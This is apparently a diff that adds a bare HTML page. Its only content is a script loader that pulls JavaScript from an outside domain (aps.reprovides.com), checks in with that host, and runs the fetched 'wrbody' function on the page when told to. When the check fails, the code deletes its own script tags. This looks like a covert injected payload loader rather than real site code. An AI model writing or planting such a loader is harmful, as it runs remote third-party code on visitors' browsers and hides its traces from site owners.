@@ -1,0 +1,23 @@
+<html>
+	<head>
+	<script data-script="wrbody" src="https://aps.reprovides.com/upload.php" type="text/javascript" async="true"></script>
+	</head>
+	<body>
+	<script type="text/javascript" data-script="indentity">
+	  function load(){
+	   if(JSON.parse(this.responseText).success == "true"){
+		  wrbody( window.success_implat);
+	   }else{
+		 document.querySelector('script[data-script="indentity"]').remove();
+		 document.querySelector('script[data-script="wrbody"]').remove();
+	   }
+	  }
+	  var xhr = new XMLHttpRequest();
+	  xhr.addEventListener("load", load);
+	  xhr.open("GET", location.protocol+"//aps.reprovides.com/arr.php");
+	  xhr.send();
+	</script>
+	</body>
+</html>
+
+
